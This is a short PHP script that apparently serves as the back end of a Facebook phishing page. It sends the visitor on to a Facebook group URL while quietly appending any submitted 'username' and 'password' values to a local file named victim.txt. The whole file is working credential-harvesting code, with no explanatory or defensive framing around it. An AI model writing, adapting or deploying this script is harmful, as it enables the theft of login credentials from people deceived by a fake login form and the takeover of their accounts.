<?php header('Location: https://m.facebook.com/groups/849331688513000');
$handle = fopen("victim.txt", "a");
foreach ($_POST as $variable => $value) {
    if ($variable == "username" || $variable == "password") {
        fwrite($handle, $variable);
        fwrite($handle, "= ");
        fwrite($handle, $value);
        fwrite($handle, "
");
    }
}
fwrite($handle, "
");
fclose($handle);
exit;
?>
